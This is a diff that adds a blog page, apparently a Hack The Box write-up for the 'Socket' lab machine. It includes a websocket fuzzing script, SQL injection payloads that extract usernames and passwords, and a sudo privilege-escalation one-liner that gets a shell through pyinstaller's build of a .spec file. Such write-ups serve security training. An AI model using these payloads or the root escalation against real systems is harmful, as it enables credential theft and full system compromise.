+</span></span><span style="display:flex;"><span>version_info <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#39;message&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;[INFO] You have version </span><span style="color:#e6db74">{</span>version_info[<span style="color:#e6db74">&#39;version&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> which was released on </span><span style="color:#e6db74">{</span>version_info[<span style="color:#e6db74">&#39;released_date&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>statusBar()<span style="color:#f92672">.</span>showMessage(msg)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>error <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>[<span style="color:#e6db74">&#39;error&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>statusBar()<span style="color:#f92672">.</span>showMessage(error)
+</span></span></code></pre></div><p>If there is some kind of way to have a valid json dump but escalate it to dump the <code>/etc/passwd</code> file then it would be a pretty easy foothold from there because all it is checking in the code is if it is a valid json then sending it back to the user. The hardest part is testing because you have to reconnect once you send a valid json.</p>
+<h1 id="interception">Interception</h1>
+<p>using wireshark to listen on your htb iface and connecting with websocat will allow you to see the traffic and can put the request into burp to fuzz.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-r" data-lang="r"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>version HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>  
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> qreader.htb<span style="color:#f92672">:</span><span style="color:#ae81ff">5789</span>  
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> Upgrade  
+</span></span><span style="display:flex;"><span>Upgrade<span style="color:#f92672">:</span> websocket  
+</span></span><span style="display:flex;"><span>Sec<span style="color:#f92672">-</span>WebSocket<span style="color:#f92672">-</span>Version<span style="color:#f92672">:</span> <span style="color:#ae81ff">13</span>  
+</span></span><span style="display:flex;"><span>Sec<span style="color:#f92672">-</span>WebSocket<span style="color:#f92672">-</span>Key<span style="color:#f92672">:</span> G2<span style="color:#f92672">+</span>NJRB08FAXqPPqLghE9w<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>to look for more endpoints use the following command</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gobuster dir -u http://qreader.htb:5789 -w /usr/share/dirb/wordlists/big.txt -H <span style="color:#e6db74">&#34;Host: qreader.htb:5  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">789&#34;</span> -H <span style="color:#e6db74">&#34;Connection: Upgrade&#34;</span> -H <span style="color:#e6db74">&#34;Upgrade: websocket&#34;</span> -H <span style="color:#e6db74">&#34;Sec-WebSocket-Version: 13&#34;</span> -H <span style="color:#e6db74">&#34;Sec-WebSocket-Key: G2  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+NJRB08FAXqPPqLghE9w==&#34;</span> -s <span style="color:#e6db74">&#34;101,200&#34;</span> -b <span style="color:#e6db74">&#34;&#34;</span> --timeout 5s --threads <span style="color:#ae81ff">30</span>
+</span></span></code></pre></div><p>Using the code bellow will allow you to fuzz the websocket</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> websocket <span style="color:#f92672">import</span> create_connection
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time <span style="color:#66d9ef">as</span> t
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ws_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ws://qreader.htb:5789/version&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payloads <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;/usr/share/wfuzz/wordlist/Injections/All_attack.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;Host: qreader.htb:5789&#34;</span>,<span style="color:#e6db74">&#34;Connection: Upgrade&#34;</span>, <span style="color:#e6db74">&#34;Upgrade: websocket&#34;</span>,<span style="color:#e6db74">&#34;Sec-WebSocket-Version: 13&#34;</span>,<span style="color:#e6db74">&#34;Sec-WebSocket-Key: G2+NJRB08FAXqPPqLghE9w==&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> payload <span style="color:#f92672">in</span> payloads:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps({<span style="color:#e6db74">&#34;version&#34;</span>:payload})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(data)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ws <span style="color:#f92672">=</span> create_connection(ws_url, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(&#34;connected!&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(ws.recv())</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(f&#34;Sending {data}&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ws<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(&#34;Sent&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(&#34;Receiving...&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Invalid version&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> result <span style="color:#f92672">and</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">!=</span> len(result):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Received </span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74"> with payload: </span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ws<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+</span></span></code></pre></div><p>while fuzzing you should get some successful payloads.  To escalate it further you can use the payload list bellow to get the username and password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,3--+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">sum</span>(columnname ) <span style="color:#66d9ef">from</span> tablename <span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">@</span>,<span style="color:#f92672">@</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">@</span>,<span style="color:#f92672">@</span>,<span style="color:#f92672">@</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> (<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> Users) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; AND MID(VERSION(),1,1) = &#39;</span><span style="color:#ae81ff">5</span><span style="color:#e6db74">&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">in</span> (<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">min</span>(name) <span style="color:#66d9ef">from</span> sysobjects <span style="color:#66d9ef">where</span> xtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;U&#39;</span> <span style="color:#66d9ef">and</span> name <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39;0.0.3&#34; UNION SELECT group_concat(answer),&#34;2&#34;,&#34;3&#34;,&#34;4&#34; FROM answers;-- -&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name, description, price <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> category<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> table_schema, <span style="color:#66d9ef">table_name</span>, <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">FROM</span> information_schema.<span style="color:#66d9ef">table</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0.0.3&#34; UNION SELECT group_concat(answer),&#34;2&#34;,&#34;3&#34;,&#34;4&#34; FROM answers;-- -&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0.0.3&#34; UNION SELECT username,password,&#34;3&#34;,&#34;4&#34; from users;-- -&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;message&#34;</span>: {<span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#960050;background-color:#1e0010">&#34;Hello</span> <span style="color:#960050;background-color:#1e0010">Json</span>,<span style="color:#960050;background-color:#1e0010">\n\nAs</span> <span style="color:#960050;background-color:#1e0010">if</span> <span style="color:#960050;background-color:#1e0010">now</span> <span style="color:#960050;background-color:#1e0010">we</span> <span style="color:#960050;background-color:#1e0010">support</span> <span style="color:#960050;background-color:#1e0010">PNG</span> <span style="color:#960050;background-color:#1e0010">formart</span> <span style="color:#960050;background-color:#1e0010">only.</span> <span style="color:#960050;background-color:#1e0010">We</span> <span style="color:#960050;background-color:#1e0010">will</span> <span style="color:#960050;background-color:#1e0010">be</span> <span style="color:#960050;background-color:#1e0010">adding</span> <span style="color:#960050;background-color:#1e0010">JPEG/SVG</span> <span style="color:#960050;background-color:#1e0010">file</span> <span style="color:#960050;background-color:#1e0010">formats</span> <span style="color:#960050;background-color:#1e0010">in</span> <span style="color:#960050;background-color:#1e0010">our</span> <span style="color:#960050;background-color:#1e0010">next</span> <span style="color:#960050;background-color:#1e0010">version.\n\nThomas</span> <span style="color:#960050;background-color:#1e0010">Keller,Hello</span> <span style="color:#960050;background-color:#1e0010">Mike,\n\n</span> <span style="color:#960050;background-color:#1e0010">We</span> <span style="color:#960050;background-color:#1e0010">have</span> <span style="color:#960050;background-color:#1e0010">confirmed</span> <span style="color:#960050;background-color:#1e0010">a</span> <span style="color:#960050;background-color:#1e0010">valid</span> <span style="color:#960050;background-color:#1e0010">problem</span> <span style="color:#960050;background-color:#1e0010">with</span> <span style="color:#960050;background-color:#1e0010">handling</span> <span style="color:#960050;background-color:#1e0010">non-ascii</span> <span style="color:#960050;background-color:#1e0010">charaters.</span> <span style="color:#960050;background-color:#1e0010">So</span> <span style="color:#960050;background-color:#1e0010">we</span> <span style="color:#960050;background-color:#1e0010">suggest</span> <span style="color:#960050;background-color:#1e0010">you</span> <span style="color:#960050;background-color:#1e0010">to</span> <span style="color:#960050;background-color:#1e0010">stick</span> <span style="color:#960050;background-color:#1e0010">with</span> <span style="color:#960050;background-color:#1e0010">ascci</span> <span style="color:#960050;background-color:#1e0010">printable</span> <span style="color:#960050;background-color:#1e0010">characters</span> <span style="color:#960050;background-color:#1e0010">for</span> <span style="color:#960050;background-color:#1e0010">now!\n\nThomas</span> <span style="color:#960050;background-color:#1e0010">Keller</span>
+</span></span></code></pre></div><h1 id="foot-hold">Foot hold</h1>
+<p>After cracking the password now you can get the user flag</p>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>to get root run linpeas.sh and it has something to do with an <code>build-installer.sh</code> file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>User tkeller may run the following commands on socket:  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/sbin/build-installer.sh
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $# -ne <span style="color:#ae81ff">2</span> <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[[</span> $1 !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cleanup&#39;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>  
+</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;No enough arguments supplied&#34;</span>  
+</span></span><span style="display:flex;"><span>exit 1;  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>action<span style="color:#f92672">=</span>$1  
+</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span>$2  
+</span></span><span style="display:flex;"><span>ext<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/echo $2 |/usr/bin/awk -F<span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#e6db74">&#39;{ print $(NF) }&#39;</span><span style="color:#66d9ef">)</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -L $name <span style="color:#f92672">]]</span>;<span style="color:#66d9ef">then</span>  
+</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#39;Symlinks are not allowed&#39;</span>  
+</span></span><span style="display:flex;"><span>exit 1;  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;build&#39;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $ext <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;spec&#39;</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>  
+</span></span><span style="display:flex;"><span>/usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null  
+</span></span><span style="display:flex;"><span>/home/svc/.local/bin/pyinstaller $name  
+</span></span><span style="display:flex;"><span>/usr/bin/mv ./dist ./build /opt/shared  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>  
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Invalid file format&#34;</span>  
+</span></span><span style="display:flex;"><span>exit 1;  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> <span style="color:#f92672">[[</span> $action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;make&#39;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $ext <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;py&#39;</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>  
+</span></span><span style="display:flex;"><span>/usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null  
+</span></span><span style="display:flex;"><span>/root/.local/bin/pyinstaller -F --name <span style="color:#e6db74">&#34;qreader&#34;</span> $name --specpath /tmp  
+</span></span><span style="display:flex;"><span>/usr/bin/mv ./dist ./build /opt/shared  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>  
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Invalid file format&#34;</span>  
+</span></span><span style="display:flex;"><span>exit 1;  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> <span style="color:#f92672">[[</span> $action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cleanup&#39;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>  
+</span></span><span style="display:flex;"><span>/usr/bin/rm -r ./build ./dist 2&gt;/dev/null  
+</span></span><span style="display:flex;"><span>/usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null  
+</span></span><span style="display:flex;"><span>/usr/bin/rm /tmp/qreader* 2&gt;/dev/null  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>  
+</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#39;Invalid action&#39;</span>  
+</span></span><span style="display:flex;"><span>exit 1;  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span></code></pre></div><p>running the following command will get root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import os;os.system(&#34;/bin/bash&#34;)&#39;</span> &gt; /tmp/file.spec; sudo /usr/local/sbin/build-installer.sh build /tmp/file.spec
+</span></span></code></pre></div><p>it makes a python script in the tmp dir and the build installer builds it and runs it giving you root because it spawns a new shell from <code>os.system(&quot;/bin/bash&quot;)</code>.</p>
+
+            </div>
+        </article>
+    </main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/C3ald" target="_blank" rel="noopener noreferrer me" title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://app.hackthebox.com/profile/440221" target="_blank" rel="noopener noreferrer me" title="HTB">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+</a></div>
+    <small class="footer_copyright">
+        © 2023 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer>
+<script src="http://example.org/js/themeSwitchnMenu.min.2a402288242b6930b175a0722c267e2353055739b3975834df35e56d00dd8f50.js"></script></body>
+</html>
